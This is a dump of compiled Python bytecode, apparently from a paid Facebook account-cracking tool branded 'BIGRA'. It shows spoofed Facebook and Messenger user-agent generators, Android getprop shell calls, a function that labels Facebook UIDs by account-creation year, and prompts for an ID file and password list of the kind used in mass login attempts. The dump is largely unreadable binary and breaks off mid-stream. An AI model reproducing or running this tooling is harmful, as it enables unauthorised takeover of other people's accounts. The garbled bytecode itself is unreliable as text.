https://chat.whatsapp.com/FeUqeXZuiKu3CVaIP9dp0s)\x01\xda\x01*)\x01\xda\x12ThreadPoolExecutorz$ \n\n Module Not installed Correctly! \xe9\x05\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x03\x00\x00\x00\xf3\xb4\x01\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00g\x00d\x01\xa2\x01\xab\x01\x00\x00\x00\x00\x00\x00}\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00g\x00d\x02\xa2\x01\xab\x01\x00\x00\x00\x00\x00\x00}\x01t\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00g\x00d\x03\xa2\x01\xab\x01\x00\x00\x00\x00\x00\x00}\x02d\x04t\x05\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05d\x06\xab\x02\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00z\x00\x00\x00d\x07z\x00\x00\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x08d\t\xab\x02\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05d\x06\xab\x02\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00z\x00\x00\x00d\nz\x00\x00\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0bd\x0c\xab\x02\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00z\x00\x00\x00d\rz\x00\x00\x00}\x03d\x0e}\x04|\x03|\x04z\x00\x00\x00}\x05|\x05S\x00)\x0fN)\t\xda\x05en_US\xda\x05en_GB\xda\x05en_PK\xda\x05ru_RU\xda\x05de_DE\xda\x05th_TH\xda\x05en_BD\xda\x05en_IN\xda\x05en_AF)\x03\xfa\x13com.facebook.katana\xfa\x11com.facebook.orca\xfa\x12com.facebook.mlite)\x08z\x07o2 - dez\x0cVerizon - usz\tMY CELCOMz\rVodafone - uk\xda\x04null\xda\x04DTACz\nIND airtelz\rNepal Telecom\xfa\x10[FBAN/FB4A;FBAV/\xe9\x0b\x00\x00\x00\xe9M\x00\x00\x00\xfa\x05.0.0.\xe9\t\x00\x00\x00\xe91\x00\x00\x00\xfa\x06;FBBV/\xe9G\xf4\x10\x00i\xf1\xadv\x00a(\x01\x00\x00;[Davik/2.1.0 (Linux; U; Android 12; Infinix X6817 Build/SP1A.210812.016) [FBAN/MessengerLite;FBAV/308.0.0.3.90;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/521471303;FBCR/Jazz;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X6817;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]a\x9d\x02\x00\x00FBAN/FB4A;FBAV/340.0.0.31.63;FBBV/1397400;FBDM/{density=2.5,width=720,height=1456};FBLC/en_US;FBRV/444411021;FBCR/I TIM;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/CPH7991;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]FBAN/FB4A;FBAV/356.0.0.31.63;FBBV/1816189;FBDM/{density=2.5,width=720,height=1456};FBLC/en_US;FBRV/444411021;FBCR/I TIM;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/CPH1615;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]FBAN/FB4A;FBAV/479.0.0.31.63;FBBV/5863778;FBDM/{density=2.5,width=720,height=1456};FBLC/en_US;FBRV/444411021;FBCR/I TIM;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/CPH7577;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;])\x05\xda\x06random\xda\x06choice\xda\x03str\xda\x07randint\xda\trandrange)\x06\xda\x02en\xda\x02kt\xda\x04fbcr\xda\x01s\xda\x01e\xda\x02uas\x06\x00\x00\x00      \xda\x01 \xda\x05BIGR9r)\x00\x00\x00\x14\x00\x00\x00s\xe9\x00\x00\x00\x80\x00\xdc\t\x0f\x8f\x1d\x89\x1d\xd2\x17`\xd3\ta\x80B\xdc\t\x0f\x8f\x1d\x89\x1d\xd2\x17W\xd3\tX\x80B\xdc\x0b\x11\x8f=\x89=\xd2\x19{\xd3\x0b|\x80D\xd8\x08\x1a\x9c3\x9cv\x9f~\x99~\xa8b\xb0\x12\xd3\x1f4\xd3\x1b5\xd1\x085\xb0g\xd1\x08=\xbcc\xc4&\xd7BR\xd1BR\xd0ST\xd0UW\xd3BX\xd3>Y\xd1\x08Y\xd4Z]\xd4^d\xd7^l\xd1^l\xd0mo\xd0pr\xd3^s\xd3Zt\xd1\x08t\xd0v~\xd1\x08~\xf4\x00\x00@\x02C\x02\xf4\x00\x00D\x02J\x02\xf7\x00\x00D\x02R\x02\xf1\x00\x00D\x02R\x02\xf0\x00\x00S\x02Z\x02\xf0\x00\x00[\x02b\x02\xf3\x00\x00D\x02c\x02\xf3\x00\x00@\x02d\x02\xf1\x00\x00\td\x02\xf0\x00\x00e\x02O\x07\xf1\x00\x00\tO\x07\x80A\xf0\x02\x00\tn\n\x80A\xd8\t\n\x88Q\x89\x15\x80B\xd8\x0b\r\x80I\xf3\x00\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\x03\x00\x00\x00\xf3\xc8\x00\x00\x00\x97\x00d\x01d\x02g\x02}\x00d\x03t\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x04d\x05\xab\x02\x00\x00\x00\x00\x00\x00\x9b\x00d\x06t\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x07d\x08\xab\x02\x00\x00\x00\x00\x00\x00\x9b\x00d\tt\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\nd\x0b\xab\x02\x00\x00\x00\x00\x00\x00\x9b\x00d\x0ct\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00\xab\x01\x00\x00\x00\x00\x00\x00\x9b\x00\x9d\x08}\x01|\x01S\x00)\rNz\xef[FBAN/FB4A;FBAV/455.0.0.0.35;[FBAN/FB4A;FBAVFBBV/450004028;FBDM/{density=6.6,width=1080,height=2340};FBLC/en_US;FBRV/213152948;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A356U;FBSV/14;FBOP/19;FBCA/arm64-v8a:;]z\xef[FBAN/FB4A;FBAV/463.0.0.0.50;[FBAN/FB4A;FBAVFBBV/451606073;FBDM/{density=6.6,width=1080,height=2340};FBLC/en_US;FBRV/213152948;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A356U;FBSV/14;FBOP/19;FBCA/arm64-v8a:;]r\x15\x00\x00\x00r\x16\x00\x00\x00\xe9c\x00\x00\x00r\x18\x00\x00\x00iW\x04\x00\x00i\x0f\'\x00\x00r\x1b\x00\x00\x00r\x1c\x00\x00\x00i\x7f\x96\x98\x00\xda\x01;)\x03r\x1d\x00\x00\x00r \x00\x00\x00r\x1e\x00\x00\x00)\x02\xda\r____sexua____\xda\n____ua____s\x02\x00\x00\x00  r(\x00\x00\x00\xda\x11____useragent____r0\x00\x00\x00\x1d\x00\x00\x00s\x91\x00\x00\x00\x80\x00\xf0\x04\x00\x02s\x03\xf0\x02\x00\x02s\x03\xf0\x05\x02\x12t\x03\x80\x1d\xf0\x06\x00\x11!\xa4\x16\xa7\x1e\xa1\x1e\xb0\x02\xb02\xd3!6\xd0 7\xb0u\xbcV\xbf^\xb9^\xc8D\xd0QU\xd3=V\xd0<W\xd0W]\xd4^d\xd7^l\xd1^l\xd0mt\xd0u|\xd3^}\xd0]~\xd0~\x7f\xf4\x00\x00A\x02G\x02\xf7\x00\x00A\x02N\x02\xf1\x00\x00A\x02N\x02\xf0\x00\x00O\x02\\\x02\xf3\x00\x00A\x02]\x02\xf0\x00\x00@\x02^\x02\xf0\x00\x00\x0f_\x02\x80\x1a\xd8\x08\x12\xd0\x01\x12r*\x00\x00\x00i\xe8\x03\x00\x00z\x1cMozilla/5.0 (Linux; Android;)\x07\xda\x016\xda\x017\xda\x018\xda\x019\xda\x0210\xda\x0211\xda\x0212z\x1fen-us; 12; Infinix X6817 Build/)\x1a\xda\x01A\xda\x01B\xda\x01C\xda\x01D\xda\x01E\xda\x01F\xda\x01G\xda\x01H\xda\x01I\xda\x01J\xda\x01K\xda\x01L\xda\x01M\xda\x01N\xda\x01O\xda\x01P\xda\x01Q\xda\x01R\xda\x01S\xda\x01T\xda\x01U\xda\x01V\xda\x01W\xda\x01X\xda\x01Y\xda\x01Z\xe9\x01\x00\x00\x00\xe9\xe7\x03\x00\x00zFAppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.5462.85\xe9F\x00\x00\x00\xe9^\x00\x00\x00\xda\x010iP\x14\x00\x00i\x0c\x17\x00\x00\xe9\x1e\x00\x00\x00i"\x01\x00\x00z\x14Mobile Safari/537.36r(\x00\x00\x00z\x02; z\x02) \xda\x01.)\x05z\x17com.facebook.adsmanagerz\x11com.facebook.liter\x11\x00\x00\x00r\x10\x00\x00\x00r\x12\x00\x00\x00)\x95\xfa\x0fSM-G920F|NRD90Mz\x0eSM-T535|LRX22G\xfa\x0eSM-T231|KOT49H\xfa\x0fSM-J320F|LMY47V\xfa\x0fGT-I9190|KOT49H\xfa\x0fGT-N7100|KOT49H\xfa\x0eSM-T561|KTU84Pr]\x00\x00\x00\xfa\x0fGT-I9500|LRX22Cr[\x00\x00\x00\xfa\x0fSM-G930F|NRD90Mr[\x00\x00\x00\xfa\x10SM-J510FN|NMF26Xz\x0fGT-P5100|IML74Kr[\x00\x00\x00\xfa\x0fGT-N8000|JZO54K\xfa\x0eSM-T531|LRX22Gz\x0fSPH-L720|KOT49Hz\x0eGT-I9500|JDQ39\xfa\x0fSM-G935F|NRD90Mr^\x00\x00\x00z\x0eSM-T531|KOT49H\xfa\x10SM-J320FN|LMY47V\xfa\x0fSM-A500F|MMB29M\xfa\x10SM-A500FU|MMB29Mrf\x00\x00\x00\xfa\x0eSM-T311|KOT49Hrc\x00\x00\x00r[\x00\x00\x00re\x00\x00\x00r[\x00\x00\x00\xfa\x0fGT-P5210|KOT49Hz\x0eSM-T230|KOT49H\xfa\x0fGT-I9192|KOT49Hz\x0cSM-T235|KOT4r]\x00\x00\x00\xfa\x0fSM-A500F|LRX22Grf\x00\x00\x00r]\x00\x00\x00z\x0fSM-G920F|MMB29Kra\x00\x00\x00rb\x00\x00\x00re\x00\x00\x00re\x00\x00\x00z\x0fSM-A500H|MMB29M\xfa\x0fGT-I9300|JSS15Jr_\x00\x00\x00z\rSM-J320F|LMY4ra\x00\x00\x00rf\x00\x00\x00\xfa\x0fGT-N8000|KOT49Hr^\x00\x00\x00z\x0fSM-G900F|KOT49Hz\x0fGT-S7390|JZO54Kr[\x00\x00\x00z\x0fGT-P5100|JZO54Krg\x00\x00\x00r`\x00\x00\x00ra\x00\x00\x00r^\x00\x00\x00rm\x00\x00\x00rc\x00\x00\x00z\x10SM-J510FN|MMB29Mra\x00\x00\x00r[\x00\x00\x00z\x0eGT-P5110|JDQ39\xfa\x10GT-I9301I|KOT49Hrk\x00\x00\x00r`\x00\x00\x00z\x0cSM-T311|KOT4\xfa\x0fGT-P5200|KOT49Hrn\x00\x00\x00z\x0fSM-J320M|LMY47Vrc\x00\x00\x00\xfa\x0eSM-T820|NRD90Mrj\x00\x00\x00z\x0fSM-G935F|MMB29Kz\x10SM-J701F|NRD90M;z\x0eGT-I9301I|KOT4re\x00\x00\x00z\rSM-T111|JDQ39rf\x00\x00\x00z\x0eSM-J510FN|NMF2z\x0eSM-T705|LRX22GrY\x00\x00\x00\xfa\x0fGT-N5100|JZO54K\xfa\x10GT-I9300I|KTU84Prr\x00\x00\x00rm\x00\x00\x00rm\x00\x00\x00rf\x00\x00\x00r\\\x00\x00\x00ra\x00\x00\x00r[\x00\x00\x00z\x0eGT-P5100|JDQ39rr\x00\x00\x00rq\x00\x00\x00rm\x00\x00\x00r_\x00\x00\x00re\x00\x00\x00rf\x00\x00\x00rb\x00\x00\x00\xfa\x0eSM-T805|LRX22GrZ\x00\x00\x00rq\x00\x00\x00z\x0fSM-J320H|LMY47VrZ\x00\x00\x00r`\x00\x00\x00rd\x00\x00\x00z\x0eSM-T310|KOT49Hrm\x00\x00\x00rr\x00\x00\x00rY\x00\x00\x00ra\x00\x00\x00z\x0fSM-T705|LRX22G;z\x0fGT-P3110|JZO54Krj\x00\x00\x00r[\x00\x00\x00rY\x00\x00\x00z\x0fGT-I9300|IMM76Dz\x0fSM-G950F|NRD90Mr[\x00\x00\x00\xfa\x11SM-J510FN|NMF26X;z\x0fSM-J701F|NRD90Mrk\x00\x00\x00rZ\x00\x00\x00rh\x00\x00\x00re\x00\x00\x00ri\x00\x00\x00rs\x00\x00\x00r_\x00\x00\x00ro\x00\x00\x00rn\x00\x00\x00rl\x00\x00\x00r]\x00\x00\x00rc\x00\x00\x00rp\x00\x00\x00z\rSM-T315|JDQ39r[\x00\x00\x00r\\\x00\x00\x00z\x0eGT-P5220|JDQ39z\x0eSM-T525|KOT49Hz\x0eSM-T555|LRX22Gr\\\x00\x00\x00rt\x00\x00\x00rf\x00\x00\x00rj\x00\x00\x00z\x0cGT-P5100|JDQrh\x00\x00\x00\xda\x00z getprop ro.build.version.releaseT)\x01\xda\x05shellz\x05utf-8\xda\x01\nz\x18getprop ro.product.modelz\x13getprop ro.build.idr\x07\x00\x00\x00z\x1agetprop gsm.operator.alpha\xda\x01,\xda\x06Roshanz\x1fgetprop ro.product.manufacturerz\x18getprop ro.product.brandz\x1egetprop ro.product.cpu.abilist\xda\x01:z\x15{density=2.25,height=z\'getprop ro.hwui.text_large_cache_heightz\x07,width=z&getprop ro.hwui.text_large_cache_width)\x02\xda\x011\xda\x012r{\x00\x00\x00r|\x00\x00\x00\xda\x06Roahan)\n\xda\x0fandroid_version\xda\x05model\xda\x05build\xda\x04fblc\xda\x04fbmf\xda\x04fbbd\xda\x04fbdv\xda\x04fbsv\xda\x04fbca\xda\x04fbdmc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\xf3L\x00\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00t\x06\x00\x00\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00y\x00)\x02N\xda\x05clear)\x04\xda\x02os\xda\x06system\xda\x05print\xda\x04logo\xa9\x00r*\x00\x00\x00r(\x00\x00\x00r\x89\x00\x00\x00r\x89\x00\x00\x00g\x00\x00\x00s\x15\x00\x00\x00\x80\x00\xdc\x04\x06\x87I\x81I\x88g\xd4\x04\x16\xdc\x04\t\x8c$\x85Kr*\x00\x00\x00a\xd3\x01\x00\x00\x1b[1;97m\nd8888b. d888888b  d888b  d8888b.  .d8b.  \n88  `8D   `88\'   88\' Y8b 88  `8D d8\' `8b \n88oooY\'    88    88      88oobY\' 88ooo88 \n88~~~b.    88    88  ooo 88`8b   88~~~88 \n88   8D   .88.   88. ~8~ 88 `88. 88   88 \nY8888P\' Y888888P  Y888P  88   YD YP   YP  \n\x1b[1;37m--------------------------------------------------\n Owner      :  Monster\n Facebook   :  Bigra Mahar \n Version    :  15.3\n Status     :  Paid\n\x1b[1;37m--------------------------------------------------c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\xf3\x1a\x00\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00y\x00)\x02Nz@\x1b[1;37m--------------------------------------------------\x1b[1;33m)\x01r\x8c\x00\x00\x00r\x8e\x00\x00\x00r*\x00\x00\x00r(\x00\x00\x00\xda\x04liner\x90\x00\x00\x00y\x00\x00\x00s\x0b\x00\x00\x00\x80\x00\xdc\x04\t\xd0\x0cR\xd5\x04Tr*\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\xf3:\x02\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00|\x00\xab\x01\x00\x00\x00\x00\x00\x00d\x01k(\x00\x00r\xd5|\x00d\x00d\x02\x1a\x00d\x03v\x00r\x04d\x04}\x01|\x01S\x00|\x00d\x00d\x05\x1a\x00d\x06v\x00r\x04d\x07}\x01|\x01S\x00|\x00d\x00d\x08\x1a\x00d\tv\x00r\x04d\n}\x01|\x01S\x00|\x00d\x00d\x0b\x1a\x00d\x0cv\x00r\x04d\n}\x01|\x01S\x00|\x00d\x00d\x0b\x1a\x00d\rv\x00r\x04d\x0e}\x01|\x01S\x00|\x00d\x00d\x0f\x1a\x00d\x10v\x00r\x04d\x11}\x01|\x01S\x00|\x00d\x00d\x0f\x1a\x00d\x12v\x00r\x04d\x13}\x01|\x01S\x00|\x00d\x00d\x0f\x1a\x00d\x14v\x00r\x04d\x15}\x01|\x01S\x00|\x00d\x00d\x0f\x1a\x00d\x16v\x00r\x04d\x17}\x01|\x01S\x00|\x00d\x00d\x0f\x1a\x00d\x18v\x00r\x04d\x17}\x01|\x01S\x00|\x00d\x00d\x0f\x1a\x00d\x19v\x00r\x04d\x1a}\x01|\x01S\x00|\x00d\x00d\x1b\x1a\x00d\x1cv\x00r\x04d\x1a}\x01|\x01S\x00|\x00d\x00d\x1b\x1a\x00d\x1dv\x00r\x04d\x1a}\x01|\x01S\x00|\x00d\x00d\x1b\x1a\x00d\x1ev\x00r\x04d\x1a}\x01|\x01S\x00|\x00d\x00d\x1b\x1a\x00d\x1fv\x00r\x04d\x1a}\x01|\x01S\x00|\x00d\x00d\x1b\x1a\x00d v\x00r\x04d\x1a}\x01|\x01S\x00|\x00d\x00d\x1b\x1a\x00d!v\x00r\x04d\x1a}\x01|\x01S\x00|\x00d\x00d\x1b\x1a\x00d"v\x00r\x04d\x1a}\x01|\x01S\x00|\x00d\x00d\x1b\x1a\x00d#v\x00r\x04d$}\x01|\x01S\x00d%}\x01|\x01S\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00|\x00\xab\x01\x00\x00\x00\x00\x00\x00d&v\x00r\x04d\'}\x01|\x01S\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00|\x00\xab\x01\x00\x00\x00\x00\x00\x00d\x08k(\x00\x00r\x04d(}\x01|\x01S\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00|\x00\xab\x01\x00\x00\x00\x00\x00\x00d\x0bk(\x00\x00r\x04d)}\x01|\x01S\x00d%}\x01|\x01S\x00)*N\xe9\x0f\x00\x00\x00\xe9\n\x00\x00\x00)\x01\xda\n1000000000z\x0e (*-*) 2009 OKr\x19\x00\x00\x00)\x01\xda\t100000000z\x11 ACCOUNT  2009 OK\xe9\x08\x00\x00\x00)\x01\xda\x0810000000z\x10 ACCOUNT 2009 OK\xe9\x07\x00\x00\x00)\x06\xda\x071000000\xda\x071000001\xda\x071000002\xda\x071000003\xda\x071000004\xda\x071000005)\x04\xda\x071000006\xda\x071000007\xda\x071000008\xda\x071000009z\x10 ACCOUNT 2010 OK\xe9\x06\x00\x00\x00)\x01\xda\x06100001z\x18 ACCOUNT 2010/2011 OK ID)\x02\xda\x06100002\xda\x06100003z\x18 ACCOUNT 2011/2012 OK ID)\x01\xda\x06100004z\x18 ACCOUNT 2012/2013 OK ID)\x02\xda\x06100005\xda\x06100006z\t ACCOUNT )\x02\xda\x06100007\xda\x06100008)\x01\xda\x06100009z\x07 OK ID r\x05\x00\x00\x00)\x01\xda\x0510001)\x01\xda\x0510002)\x01\xda\x0510003)\x01\xda\x0510004)\x01\xda\x0510005)\x03\xda\x0510006\xda\x0510007ru\x00\x00\x00)\x01\xda\x0510008)\x01\xda\x0510009z\x06 OK IDru\x00\x00\x00)\x02r\x19\x00\x00\x00r\x93\x00\x00\x00z\x15 ACCOUNT 2008/2009 OKz\x15 ACCOUNT 2007/2008 OKz\x15 ACCOUNT 2006/2007 OK)\x01\xda\x03len)\x02\xda\x03uid\xda\x04alifs\x02\x00\x00\x00  r(\x00\x00\x00\xda\x04ashar\xb9\x00\x00\x00\x83\x00\x00\x00s\x7f\x02\x00\x00\x80\x00\xdc\x07\n\x883\x83x\x90\x12\x82|\xd8\x0b\x0e\x88s\x90\x02\x888\x90~\xd1\x0b%\xd04D\xa8T\xf06\x00\x0c\x10\x80K\xf05\x00\x0e\x11\x90\x12\x90!\x88W\x98\r\xd1\r%\xd04G\xa8T\xf04\x00\x0c\x10\x80K\xf03\x00\x0e\x11\x90\x12\x90!\x88W\x98\x0c\xd1\r$\xd04F\xa8T\xf02\x00\x0c\x10\x80K\xf01\x00\x0e\x11\x90\x12\x90!\x88W\xd0\x18U\xd1\rU\xd0]o\xd0VZ\xf00\x00\x0c\x10\x80K\xf0/\x00\x0e\x11\x90\x12\x90!\x88W\xd0\x18A\xd1\rA\xd0I[\xc0$\xf0.\x00\x0c\x10\x80K\xf0-\x00\x0e\x11\x90\x12\x90!\x88W\x98\n\xd1\r"\xd04N\xa8T\xf0,\x00\x0c\x10\x80K\xf0+\x00\x0e\x11\x90\x12\x90!\x88W\xd0\x18+\xd1\r+\xd04N\xa8T\xf0*\x00\x0c\x10\x80K\xf0)\x00\x0e\x11\x90\x12\x90!\x88W\x98\n\xd1\r"\xd04N\xa8T\xf0(\x00\x0c\x10\x80K\xf0\'\x00\x0e\x11\x90\x12\x90!\x88W\xd0\x18+\xd1\r+\xb0K\xa8T\xf0&\x00\x0c\x10\x80K\xf0%\x00\x0e\x11\x90\x12\x90!\x88W\xd0\x18+\xd1\r+\xb0K\xa8T\xf0$\x00\x0c\x10\x80K\xf0#\x00\x0e\x11\x90\x12\x90!\x88W\x98\n\xd1\r"\xb0I\xa8T\xf0"\x00\x0c\x10\x80K\xf0!\x00\x0e\x11\x90\x12\x90!\x88W\x98\t\xd1\r!\xb0I\xa8T\xf0 \x00\x0c\x10\x80K\xf0\x1f\x00\x0e\x11\x90\x12\x90!\x88W\x98\t\xd1\r!\xb0I\xa8T\xf0\x1e\x00\x0c\x10\x80K\xf0\x1d\x00\x0e\x11\x90\x12\x90!\x88W\x98\t\xd1\r!\xb0I\xa8T\xf0\x1c\x00\x0c\x10\x80K\xf0\x1b\x00\x0e\x11\x90\x12\x90!\x88W\x98\t\xd1\r!\xb0I\xa8T\xf0\x1a\x00\x0c\x10\x80K\xf0\x19\x00\x0e\x11\x90\x12\x90!\x88W\x98\t\xd1\r!\xb0I\xa8T\xf0\x18\x00\x0c\x10\x80K\xf0\x17\x00\x0e\x11\x90\x12\x90!\x88W\xd0\x18,\xd1\r,\xb0I\xa8T\xf0\x16\x00\x0c\x10\x80K\xf0\x15\x00\x0e\x11\x90\x12\x90!\x88W\x98\t\xd1\r!\xb0I\xa8T\xf0\x14\x00\x0c\x10\x80K\xf0\x13\x00\x0e\x11\x90\x12\x90!\x88W\x98\t\xd1\r!\xb0H\xa8T\xf0\x12\x00\x0c\x10\x80K\xf0\x11\x00\x13\x15\x88T\xf0\x10\x00\x0c\x10\x80K\xf4\x0f\x00\n\r\x88S\x8b\x18\x90V\xd1\t\x1b\xd8\x0f&\x88\x04\xf0\x0c\x00\x0c\x10\x80K\xf4\x0b\x00\n\r\x88S\x8b\x18\x901\x8a\x1b\xd8\x0f&\x88\x04\xf0\x08\x00\x0c\x10\x80K\xf4\x07\x00\n\r\x88S\x8b\x18\x901\x8a\x1b\xd8\x0f&\x88\x04\xe0\x0b\x0f\x80K\xf0\x03\x00\x0f\x11\x88\x14\xd8\x0b\x0f\x80Kr*\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00\xf3\xf4\x06\x00\x00\x97\x00\t\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01}\x00|\x00d\x01k(\x00\x00\x90\x02r\xddt\x03\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x03\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00d\x04\xab\x01\x00\x00\x00\x00\x00\x00}\x01|\x01d\x05v\x00\x90\x02r\xact\x01\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x03\x00\x00\x00\x00\x00\x00\x00\x00d\x06\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00d\x07\xab\x01\x00\x00\x00\x00\x00\x00}\x02\t\x00t\t\x00\x00\x00\x00\x00\x00\x00\x00|\x02d\x08\xab\x02\x00\x00\x00\x00\x00\x00j\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00j\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00}\x03t\x01\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x03\x00\x00\x00\x00\x00\x00\x00\x00d\x0b\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x03\x00\x00\x00\x00\x00\x00\x00\x00d\x0c\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00d\r\xab\x01\x00\x00\x00\x00\x00\x00}\x04t\x05\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00g\x00}\x05\t\x00t\x17\x00\x00\x00\x00\x00\x00\x00\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00d\x0e\xab\x01\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00}\x06t\x05\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x03\x00\x00\x00\x00\x00\x00\x00\x00d\x0f\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x19\x00\x00\x00\x00\x00\x00\x00\x00|\x06\xab\x01\x00\x00\x00\x00\x00\x00D\x00]#\x00\x00}\x07|\x05j\x1b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x07\x00\x00\x00\x00\x00\x00\x00\x00d\x10|\x07d\nz\x00\x00\x00\x9b\x00d\x11\x9d\x03\xab\x01\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00\x8c%\x04\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x0